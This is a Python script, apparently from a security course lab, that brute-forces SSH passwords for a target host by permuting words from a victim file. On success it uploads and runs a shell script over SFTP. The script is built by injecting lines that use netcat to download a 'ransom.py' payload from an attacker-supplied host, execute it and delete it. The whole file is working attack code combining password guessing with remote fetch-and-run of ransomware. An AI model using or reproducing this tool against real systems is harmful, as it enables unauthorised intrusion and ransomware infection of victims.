#!/usr/bin/env python3

import itertools, paramiko, sys

def injectPayload(ip, port):
    f = open("virus_template.sh", "r")
    content = f.readlines()
    f.close()

    # virus payload
    payload = ["netcat " + ip + " " + port + " > ransom.py < /dev/null\n"]
    payload.append("python3 ransom.py\n")
    payload.append("rm ransom.py\n")

    # injects virus payload at line 23
    content[23:23] = payload
    content = "".join(content)

    f = open("virus.sh", "w")
    f.write(content)
    f.close()

def dictionaryAttack(hostname):
    f = open('/home/csc2021/materials/victim.dat') 
    lines = f.read().splitlines()
    f.close()

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for i in range(1, len(lines) + 1):
        for entry in list(itertools.permutations(lines, i)):
            password = ''
            for element in entry:
                password += element
            print(password + " iteration: " + str(i))
            try:
                ssh.connect(hostname, 22, "csc2021", password, auth_timeout = 0.5)
            except Exception:
                ssh.close()
                continue
            print("dictionaryAttack success!")
            injectVirus(ssh)
            ssh.close()
            return

def injectVirus(ssh):
    t = ssh.get_transport()
    sftp = paramiko.SFTPClient.from_transport(t)
    sftp.put('/home/csc2021/virus.sh', '/home/csc2021/virus.sh')
    stdin, stdout, stderr = ssh.exec_command("chmod +x virus.sh")
    stdout.read() # to force completing exec_command
    stdin, stdout, stderr = ssh.exec_command("bash virus.sh")
    stdout.read() # to force completing exec_command
    print("Virus injected!")

def main():
    injectPayload(sys.argv[2], sys.argv[3])
    dictionaryAttack(sys.argv[1])

if __name__ == '__main__':
    main()